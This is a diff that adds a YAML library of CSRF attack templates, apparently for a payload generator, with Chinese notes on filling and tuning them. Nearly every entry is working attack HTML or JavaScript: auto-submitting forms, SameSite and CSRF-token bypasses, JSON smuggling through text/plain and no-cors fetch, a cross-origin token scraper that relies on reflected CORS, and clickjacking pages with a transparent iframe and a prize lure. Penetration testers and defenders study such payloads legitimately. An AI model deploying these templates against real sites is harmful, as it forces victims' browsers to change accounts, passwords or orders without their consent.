@@ -1,0 +1,541 @@
+ruleDB: v0.1.0
+# 跨站请求伪造（CSRF）。
+#
+# 载荷全是**一段要挂到攻击者控制的页面上的 HTML**（表单、img、script、iframe），
+# 所以 content_type 一律 html——渲染出来的是页面片段，不是完整文档；语法校验
+# 那边 HTML 没有可靠 parser，会如实标注「未校验」，不假装验过。
+#
+# `<<target>>` 是每条都有的自由变量，填**完整的目标 URL**（含协议、路径，
+# GET 型还要带上查询串），因为 CSRF 的载荷和目标接口是强绑定的：
+# 「哪个接口、什么方法、什么参数」这三件事填错一件，载荷就是个废物。
+# 没有默认值（契约 3），漏填时保留 <<target>> 字面量，一眼能看出没填。
+#
+# 与 XSS 那几个 cookie 模板不同，这里不需要 no-httponly：CSRF 只是**让浏览器
+# 带着 Cookie 发请求**，读不读得到 Cookie 是另一回事。
+#
+# requires 的取舍（这张表是筛选器，多写会让用户勾了「目标没有 X」后仍看到用不上的模板）：
+#   no-csrf-token  加给所有「直接伪造请求」的条目——目标真在校验 token 且绑了用户时，
+#                  它们一条都不成立。
+#   **token 绕过那五条（unbound / exists_only / omit / length_only / url_param）
+#                  故意留空**：它们的前提是
+#                  「token 存在、但校验方式有具体缺陷」，而词表里只有「关键操作没有
+#                  CSRF 校验」这一个粗粒度的键，硬套上去会让用户声明「目标没有校验」
+#                  之后看到一堆讲 token 的载荷。这种词表覆盖不到的实现细节按
+#                  《模板写作规范》§5 的做法写进 desc，不拿无关的键凑数。
+#   weak-hardening 只加给点击劫持：它要的是目标没设 X-Frame-Options / CSP 的
+#                  frame-ancestors，属于「加固不到位」而不是「没有 CSRF 校验」。
+#   cors-misconfig 只有一条（先跨站读回页面里的 token 再提交）用得上：那条要靠
+#                  反射 Origin 才读得到正文，是这一批里唯一依赖 CORS 配置的。
+#   redirect-sink  也只有一条（用 302 换一次同站发起）：它需要一个把参数当跳转
+#                  地址的入口，没有开放重定向时那条整条不成立。
+
+templates:
+  # ---- 表单类：最常用 ----
+
+  - id: csrf.generic.form.auto
+    name: 自动提交表单（最基础）
+    desc: 最常用的一条：把受害者的浏览器当成发送器，跨站自动 POST 一次。key 填参数名、value 填要提交的值——改邮箱、改密码、下单这类操作都从这条开始。目标校验 Referer、或有绑定用户的 CSRF token 时这条不成立，改看后面那几条 token 相关模板。表单只能发 GET 和 POST，要 PUT / DELETE 就走 method.override 那条
+    vuln: [csrf]
+    content_type: [html]
+    component: []
+    version: "*"
+    body: |-
+      <form action="<<target>>" method="POST">
+      <input type="hidden" name="<<key>>" value="<<value>>">
+      </form>
+      <script>document.forms[0].submit()</script>
+    vars: [target, key, value]
+    requires: [no-csrf-token]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: csrf.generic.form.multi
+    name: 自动提交表单（多字段）
+    desc: 改密码、转账这类要一次提交多个字段的操作用这条：fields 里按 `<input type="hidden" name="a" value="1">` 的写法把字段逐个写进去，顺序照目标接口的参数顺序来，多个字段用空格隔开、**写在同一行**（变量输入框是单行的，换行进不去）。字段值里含引号就换成目标允许的那种引号，否则会把属性提前闭合、后面的字段全废掉
+    vuln: [csrf]
+    content_type: [html]
+    component: []
+    version: "*"
+    body: |-
+      <form action="<<target>>" method="POST">
+      <<fields>>
+      </form>
+      <script>document.forms[0].submit()</script>
+    vars: [target, fields]
+    requires: [no-csrf-token]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: csrf.generic.form.payload
+    name: 表单套内层载荷（两段式）
+    desc: 两段式打法：外层负责让浏览器自动把这个请求发出去，内层负责「进去之后干什么」（比如内层是一个存储型 XSS，落到后台被管理员打开时才执行）。用法是先用别的模板把内层载荷生成好、复制它的 raw 输出，再切到这条把它粘进嵌套输入。内层载荷里若含双引号会提前闭合 value 属性，那种情况改用 form.multi 自己掌握属性写法
+    vuln: [csrf]
+    content_type: [html]
+    component: []
+    version: "*"
+    body: |-
+      <form action="<<target>>" method="POST">
+      <input type="hidden" name="<<key>>" value="<<payload>>">
+      </form>
+      <script>document.forms[0].submit()</script>
+    vars: [target, key]
+    requires: [no-csrf-token]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- GET 型：目标用 GET 做状态变更时 ----
+
+  - id: csrf.generic.get.img
+    name: img 型 GET（一张图就是一次请求）
+    desc: 目标用 GET 做状态变更（很不该，但很常见）时最省事的一条：一个 img 标签就够，不经过脚本、不受 CORS 和 CSP 里 connect-src 的限制，也不挑浏览器。target 填**带完整查询串的 URL**，参数值里的特殊字符记得自己先做 URL 编码。img 的响应根本不是图片也无所谓，请求已经发出去了
+    vuln: [csrf]
+    content_type: [html]
+    component: []
+    version: "*"
+    body: <img src="<<target>>">
+    vars: [target]
+    requires: [no-csrf-token]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: csrf.generic.get.script
+    name: script 型 GET
+    desc: 和 img 那条等价，换取两个好处：不受 img-src 这类 CSP 限制，也不会被「这里必须是张图」的逻辑挡住——script 标签的请求照样发出去，响应不是合法 JS 只会报个错，请求已经完成了（JSONP 能用的就是这个性质）。target 填带查询串的完整 URL
+    vuln: [csrf]
+    content_type: [html]
+    component: []
+    version: "*"
+    body: <script src="<<target>>"></script>
+    vars: [target]
+    requires: [no-csrf-token]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: csrf.generic.get.navigate
+    name: 顶层导航 GET（绕 SameSite=Lax）
+    desc: 目标的关键操作是 GET、会话 Cookie 又是现代浏览器的默认 Lax 时用：img / script / iframe 这些**子资源请求不会带上 Lax 的 Cookie**，请求发出去也是匿名的、等于没打；改成顶层导航浏览器就会带上——Lax 只拦子资源请求和跨站 POST，顶层 GET 导航是放行的。SameSite=Strict 时这条不成立，要另找路径。target 填带查询串的完整 URL
+    vuln: [csrf]
+    content_type: [html]
+    component: []
+    version: "*"
+    body: <script>location='<<target>>'</script>
+    vars: [target]
+    requires: [no-csrf-token]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- JSON 接口的两种打法 ----
+
+  - id: csrf.generic.json.text_plain
+    name: 表单塞 JSON（enctype=text/plain）
+    desc: '目标是 JSON 接口、而表单发不出 application/json 时用：enctype 选 text/plain 后浏览器不做 URL 编码，字段名和值按「名字=值」拼成请求体，于是把 JSON 从中间切开、分到名字和值两半就能拼出合法 JSON（名字填 {"role":"admin","z":" 这样到最后一个键的引号为止的前缀，值填 "}）。副作用有两个：多出一个等号（落在最后一个键的值里），以及多出一个你自己造的键——把它写成目标本来就会忽略的字段名，别撞上真实字段。请求的 Content-Type 会是表单自己声明的 text/plain，目标得吃得下它；对多余字段严格的目标改用 json.fetch 那条'
+    vuln: [csrf]
+    content_type: [html]
+    component: []
+    version: "*"
+    body: |-
+      <form action="<<target>>" method="POST" enctype="text/plain">
+      <input name='{"<<key>>":"<<value>>","z":"' value='"}'>
+      </form>
+      <script>document.forms[0].submit()</script>
+    vars: [target, key, value]
+    requires: [no-csrf-token]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: csrf.generic.json.fetch
+    name: fetch 提交 JSON（简单请求，不触发预检）
+    desc: 目标会检查 Content-Type、必须是 application/json 时才收请求时用：fetch 带 credentials 会带上会话 Cookie，而 Content-Type 写 text/plain 让它落在「简单请求」里——写 application/json 会触发 OPTIONS 预检，目标不放行 CORS 就直接失败、请求根本发不出去。代价是目标要能吃下 text/plain 里原样的 JSON 正文（不少框架照样按 JSON 解析）。json 里含单引号会把 JS 字符串提前闭合，那种情况自己转义
+    vuln: [csrf]
+    content_type: [html]
+    component: []
+    version: "*"
+    body: <script>fetch('<<target>>',{method:'POST',credentials:'include',headers:{'Content-Type':'text/plain'},body:'<<json>>'})</script>
+    vars: [target, json]
+    requires: [no-csrf-token]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- token 存在时的绕过 ----
+  # 这三条的 requires 故意留空，理由见文件头。
+
+  - id: csrf.generic.token.unbound
+    name: token 未绑定用户（拿自己的 token 打别人）
+    desc: 目标的 token 只当「这次请求合法」的凭据、没和会话绑定（常见于 token 存在全局池、或只做 HMAC 校验不比对用户）时用：**用你自己账号的 token** 就能替受害者提交。tokenname 填目标前端用的那个参数名（csrf_token / _token / authenticity_token 这类），token 填你自己会话里的值。token 真绑了用户时这条会失败——那是正常的，不要据此判断「没有漏洞」
+    vuln: [csrf]
+    content_type: [html]
+    component: []
+    version: "*"
+    body: |-
+      <form action="<<target>>" method="POST">
+      <input type="hidden" name="<<key>>" value="<<value>>">
+      <input type="hidden" name="<<tokenname>>" value="<<token>>">
+      </form>
+      <script>document.forms[0].submit()</script>
+    vars: [target, key, value, tokenname, token]
+    requires: []
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: csrf.generic.token.exists_only
+    name: token 只校验存在、不校验值
+    desc: 目标把 token 存进了会话却忘了比对（或者校验函数写成「参数在就算过」）时用：参数名对、值随便填一个就能过。和 token.unbound 的区别是那条要你真有一份合法 token，这条只要参数名对。参数名不知道就先去页面源码或前端 JS 里找，别猜
+    vuln: [csrf]
+    content_type: [html]
+    component: []
+    version: "*"
+    body: |-
+      <form action="<<target>>" method="POST">
+      <input type="hidden" name="<<tokenname>>" value="x">
+      <input type="hidden" name="<<key>>" value="<<value>>">
+      </form>
+      <script>document.forms[0].submit()</script>
+    vars: [target, key, value, tokenname]
+    requires: []
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: csrf.generic.token.omit
+    name: token 参数留空（或整个删掉）
+    desc: 校验写成「参数存在才比对」时，**把 token 字段整个删掉**（把那一行删掉）反而能过；写成「参数必须存在」时则要把它留着、值清空。这条载荷是后者那个形态：参数留着但值为空，用来区分「缺参数就跳过校验」和「缺参数判失败」两种实现。两种各发一次再下结论，只试一种很容易误判成没有漏洞
+    vuln: [csrf]
+    content_type: [html]
+    component: []
+    version: "*"
+    body: |-
+      <form action="<<target>>" method="POST">
+      <input type="hidden" name="<<key>>" value="<<value>>">
+      <input type="hidden" name="<<tokenname>>" value="">
+      </form>
+      <script>document.forms[0].submit()</script>
+    vars: [target, key, value, tokenname]
+    requires: []
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 动词与框架相关的两条 ----
+
+  - id: csrf.generic.method.override
+    name: method override（_method 伪装动词）
+    desc: 目标用 `_method` 这个隐藏字段（Rails / Symfony / Laravel 的写法）把 POST 当成 PUT / DELETE 用时用：表单只能发 GET 和 POST，想改动词只能靠它。CSRF 校验若只挂在真正的 PUT / DELETE 上、或只对 POST 做 Referer 检查，这里就漏了。verb 填目标接受的值。另有把动词放进 X-HTTP-Method-Override 请求头的写法，那需要能发自定义头（走 json.fetch 那条的思路），表单做不到
+    vuln: [csrf]
+    content_type: [html]
+    component: []
+    version: "*"
+    slots:
+      verb: {options: [PUT, PATCH, DELETE], default: PUT}
+    body: |-
+      <form action="<<target>>" method="POST">
+      <input type="hidden" name="_method" value="<<verb>>">
+      <input type="hidden" name="<<key>>" value="<<value>>">
+      </form>
+      <script>document.forms[0].submit()</script>
+    vars: [target, key, value]
+    requires: [no-csrf-token]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: csrf.generic.clickjacking.frame
+    name: 点击劫持（透明 iframe 诱导点击）
+    desc: 和纯 CSRF 的区别要说清：CSRF 是**伪造请求**（不需要受害者交互，也不需要目标页面能被嵌），这条是骗受害者在**真实的目标页面**上自己点一下——所以目标有 CSRF token 也照样成立（点击发生在真实页面里，token 会被正常带上），它要的是目标没设 X-Frame-Options 或 CSP 的 frame-ancestors，也就是「加固不到位」那一项。target 填那个有敏感操作的页面地址；透明 iframe 覆盖的位置要按目标页面的按钮实际位置调，调不准就点不到
+    vuln: [csrf]
+    content_type: [html]
+    component: []
+    version: "*"
+    body: |-
+      <style>
+      iframe{position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.0001;z-index:2}
+      .bait{position:absolute;top:320px;left:40%;z-index:1;font-size:24px}
+      </style>
+      <div class="bait">点这里领奖</div>
+      <iframe src="<<target>>"></iframe>
+    vars: [target]
+    requires: [weak-hardening]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: csrf.generic.clickjacking.double_frame
+    name: 点击劫持（双 iframe 嵌套破 frame-busting）
+    desc: >-
+      用在目标**装了 frame-busting 脚本**（if(top!=self)top.location=self.location 这类）的场合，
+      普通的透明覆盖会被它把整个窗口导航走。外层 iframe 带 sandbox 且**不含 allow-top-navigation**，
+      目标被嵌在它里面时就无法导航顶层；sandbox 的标记会传给子浏览上下文，所以中间那层 about:blank
+      是必须的——直接把目标放进带 sandbox 的 iframe 里，父页面就读不到它的 contentDocument 了。
+      allow-same-origin 保证目标仍带得上会话 Cookie、allow-forms 保证表单能提交。
+      目标没装 frame-busting 时用 clickjacking.frame 那条就够了，这条的嵌套反而多一层出错机会。
+    vuln: [csrf]
+    content_type: [html]
+    component: []
+    version: "*"
+    body: |-
+      <style>
+      html,body{margin:0;height:100%}
+      #bait{position:absolute;top:320px;left:38%;z-index:1;font-size:24px}
+      #outer{position:absolute;top:0;left:0;width:100%;height:100%;border:0;opacity:0.0001;z-index:2}
+      </style>
+      <div id="bait">点这里继续</div>
+      <iframe id="outer" src="about:blank" sandbox="allow-scripts allow-forms allow-same-origin"></iframe>
+      <script>
+      var d=document.getElementById('outer').contentDocument;
+      d.open();
+      d.write('<iframe src="<<target>>" style="width:100%;height:100%;border:0"></iframe>');
+      d.close();
+      </script>
+    vars: [target]
+    requires: [weak-hardening]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- SameSite 的行为边界 ----
+  # 这一节里第一条是**判定清单**（不是打出去的载荷）：同一个 CSRF 载荷在 SameSite
+  # 的几种取值下结果完全不同，先照它确定浏览器的实际行为，再决定用哪条。
+
+  - id: csrf.generic.samesite.checklist
+    name: SameSite 行为判定清单
+    desc: >-
+      这不是打出去的载荷，是判定清单——同一个 CSRF 载荷在 SameSite 的几种取值下结果完全不同，
+      先照这张表确定浏览器的实际行为，再决定用哪条。第 3、5 条是能直接绕过的场合，
+      第 2、6 条是常规拦法，第 4 条说明「写了 None 但没写 Secure」反而是自伤。
+      照着目标响应头里 Set-Cookie 的**原文**逐条对，别看框架文档里的默认值。
+    vuln: [csrf]
+    content_type: [raw]
+    component: []
+    version: "*"
+    body: |-
+      SameSite 判定清单（照目标 Set-Cookie 的写法逐条对）：
+      1. 未声明 SameSite → Chrome 80+ 按 Lax 处理
+      2. SameSite=Lax → 跨站子资源不带 Cookie；顶层 GET 导航带；跨站 POST 不带
+      3. SameSite=None 且带 Secure → 跨站请求一律带上，等于没有 CSRF 防护
+      4. SameSite=None 但缺 Secure → Chrome 89+ 直接拒收这个 Cookie
+      5. 未声明 SameSite 且 Cookie 刚设置不到 2 分钟 → Chrome 的 Lax+POST 例外会带上它
+      6. SameSite=Strict → 跨站请求一律不带
+    vars: []
+    requires: []
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: csrf.generic.samesite.redirect
+    name: 用 302 换一次同站发起（绕 SameSite=Strict）
+    desc: >-
+      会话 Cookie 是 SameSite=Strict、而目标上有一个开放重定向（或任何把参数当跳转地址的入口）时用：
+      先做一次跨站顶层导航落在目标自己的域上，再由目标 302 到真正要打的那个地址——第二跳的发起方
+      变成了目标自己，浏览器就愿意把 Strict 的 Cookie 带上。**这条依赖浏览器只按当前这次跳转判断
+      SameSite**，Chrome 88 起会追溯整条重定向链，那种版本上不成立。别一上来就打关键操作：
+      先拿一条无害的 GET 到同一个地址，看服务端日志或响应里到底带没带 Cookie，再决定要不要继续。
+    vuln: [csrf]
+    content_type: [html]
+    component: []
+    version: "*"
+    slots:
+      pname:
+        options: [url, next, redirect, to, return, continue]
+        default: url
+    body: <script>location='<<target>>?<<pname>>='+encodeURIComponent('<<endpoint>>')</script>
+    vars: [target, endpoint]
+    requires: [redirect-sink]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 多步操作与跨站读 token ----
+  # 跨站读不到 iframe 里的内容，所以「先 GET 拿 token 再 POST」只有两条路：
+  # 借 CORS 把页面正文读回来（read_then_submit），或者第一步本来就不需要读
+  #（step_chain，两步之间只靠状态、不靠 token）。
+
+  - id: csrf.generic.token.read_then_submit
+    name: 先跨站读回页面里的 token 再提交
+    desc: >-
+      目标把 CSRF token 渲染在页面里、同时 CORS 又反射 Origin 时用：先用带凭据的 fetch
+      把那个页面读回来，正则抠出 value 属性，再拼一个带正确 token 的表单提交——
+      这样连「token 绑定了用户」都挡不住，因为用的是受害者自己的 token。
+      两个前提缺一不可：CORS 必须回显你的 Origin 并允许凭据（否则 fetch 读不到正文），
+      会话 Cookie 不能是 SameSite=Lax/Strict（否则第一步的跨站 fetch 带不上 Cookie）。
+      正则抠的是任何 value=，页面里有多个 token 字段时改成按 name 精确匹配。
+    vuln: [csrf]
+    content_type: [html]
+    component: []
+    version: "*"
+    body: |-
+      <script>
+      fetch('<<endpoint>>',{credentials:'include'}).then(r=>r.text()).then(function(t){
+      var m=/value="([^"]+)"/.exec(t);
+      var f=document.createElement('form');
+      f.method='POST';
+      f.action='<<target>>';
+      f.innerHTML='<input name="<<key>>" value="<<value>>"><input name="<<tokenname>>" value="'+(m?m[1]:'')+'">';
+      document.body.appendChild(f);
+      f.submit();
+      });
+      </script>
+    vars: [endpoint, target, key, value, tokenname]
+    requires: [cors-misconfig]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: csrf.generic.multi.step_chain
+    name: 多步操作链（iframe 前置 GET + 表单 POST）
+    desc: >-
+      目标的关键操作分两步（先 GET 建状态，比如往购物车放东西、初始化订单，再 POST 提交）时用。
+      第一步放在隐藏 iframe 里、第二步表单的 target 指向同一个 iframe，延时之后自动提交。
+      跨站读不到 iframe 的正文，所以这条**不能用来取 token**——第二步不校验 token、
+      或者 token 你能从别处拿到时才成立（要读 token 用 token.read_then_submit）。
+      延时按第一步的实际耗时调：太短会在页面还没加载完时就把表单发出去，宁长勿短。
+    vuln: [csrf]
+    content_type: [html]
+    component: []
+    version: "*"
+    slots:
+      ms: {options: ["1000", "3000", "5000", "10000"], default: "3000"}
+    body: |-
+      <iframe name="s" src="<<endpoint>>" style="display:none"></iframe>
+      <form id="f" action="<<target>>" method="POST" target="s">
+      <input type="hidden" name="<<key>>" value="<<value>>">
+      </form>
+      <script>setTimeout(function(){document.getElementById('f').submit()},<<ms>>)</script>
+    vars: [endpoint, target, key, value]
+    requires: [no-csrf-token]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- JSON 接口的另外两种发法 ----
+
+  - id: csrf.generic.json.no_cors
+    name: fetch 加 mode:no-cors（预检不过也照发）
+    desc: >-
+      目标只收 JSON、而你不关心能不能读到响应时用。fetch 默认 mode 是 cors，预检一旦不过，
+      浏览器**连实际请求都不会发**；改成 mode:'no-cors' 后浏览器按简单请求把它发出去
+      （响应变成 opaque、JS 读不到，但请求已经打中目标），Content-Type 由浏览器按 text/plain
+      声明、不会触发预检。credentials 要写 include 才会带 Cookie。代价是这条路彻底放弃回显，
+      只能靠状态变化判断成没成。会话 Cookie 是 SameSite=Lax/Strict 时与其他跨站 POST 一样不成立。
+    vuln: [csrf]
+    content_type: [html]
+    component: []
+    version: "*"
+    body: <script>fetch('<<target>>',{method:'POST',mode:'no-cors',credentials:'include',body:'<<json>>'})</script>
+    vars: [target, json]
+    requires: [no-csrf-token]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: csrf.generic.json.xhr
+    name: XMLHttpRequest 发 JSON（不设头也是简单请求）
+    desc: >-
+      和 json.fetch 等价的一条，差别在用的 API。xhr.send 收到字符串时浏览器会**自动**声明
+      Content-Type 为 text/plain;charset=UTF-8，所以一个自定义头都不用设、天然落在简单请求里、
+      不触发预检；withCredentials 让请求带上会话 Cookie。目标按正文解析、不挑 Content-Type 时成立。
+      手动 setRequestHeader 写 application/json 会立刻把请求变成非简单请求、触发预检，
+      预检不过就什么都发不出去——这是这条最容易踩错的地方。
+    vuln: [csrf]
+    content_type: [html]
+    component: []
+    version: "*"
+    body: |-
+      <script>
+      var x=new XMLHttpRequest();
+      x.open('POST','<<target>>',true);
+      x.withCredentials=true;
+      x.send('<<json>>');
+      </script>
+    vars: [target, json]
+    requires: [no-csrf-token]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- token 存在时的绕过（续） ----
+  # 和上面那三条 token.* 一样，这两条的 requires 也故意留空：
+  # 前提是「token 存在、但存放位置或校验方式有具体缺陷」，词表里没有对应的键。
+
+  - id: csrf.generic.token.length_only
+    name: token 只校验长度或形态
+    desc: >-
+      校验写成「长度对/格式像」时用（正则 ^[a-f0-9]{32}$ 这类，或者只判它是不是空）。
+      四个选项是四种最常见的 token 形态，按目标实际用的那种挑一个填进去。**值对不上是过不了的**——
+      这条的意义是区分「真比对值」和「只比对形态」：过了说明只校验形态，不过也只能说明它真比对了值，
+      别据此判断「没有漏洞」。要验证「不绑用户」用 token.unbound，要验证「参数在就行」用 token.exists_only。
+    vuln: [csrf]
+    content_type: [html]
+    component: []
+    version: "*"
+    slots:
+      fmt:
+        options:
+          - {id: hex32,  name: "32 位十六进制（MD5 长度）",              token: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}
+          - {id: hex64,  name: "64 位十六进制（SHA-256 长度）",          token: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}
+          - {id: b64_32, name: "32 字符 Base64（24 字节）",             token: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}
+          - {id: uuid,   name: "UUID 形态",                            token: "00000000-0000-0000-0000-000000000000"}
+        default: hex32
+    body: |-
+      <form action="<<target>>" method="POST">
+      <input type="hidden" name="<<tokenname>>" value="<<fmt.token>>">
+      <input type="hidden" name="<<key>>" value="<<value>>">
+      </form>
+      <script>document.forms[0].submit()</script>
+    vars: [target, key, value, tokenname]
+    requires: []
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: csrf.generic.token.url_param
+    name: token 挂在 URL 查询串上
+    desc: >-
+      目标从查询串读 token 时用（前端把 token 拼进 action、或框架的 _csrf 走 URL）。
+      两种情况分开看：一是**你手上已经有 token**（它出现在你打开过的页面 URL 里），
+      填进 token 提交、验证换成 query 是否照样过关；二是 token 进 URL 本身就是一个泄漏面——
+      它会跟着 Referer 与访问日志流出去，而且浏览器历史、代理日志里都会留一份。
+      tokenname 填目标用的那个参数名，token 填实际值，两个都漏填时会保留字面量、一眼能看出来。
+    vuln: [csrf]
+    content_type: [html]
+    component: []
+    version: "*"
+    body: |-
+      <form action="<<target>>?<<tokenname>>=<<token>>" method="POST">
+      <input type="hidden" name="<<key>>" value="<<value>>">
+      </form>
+      <script>document.forms[0].submit()</script>
+    vars: [target, key, value, tokenname, token]
+    requires: []
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
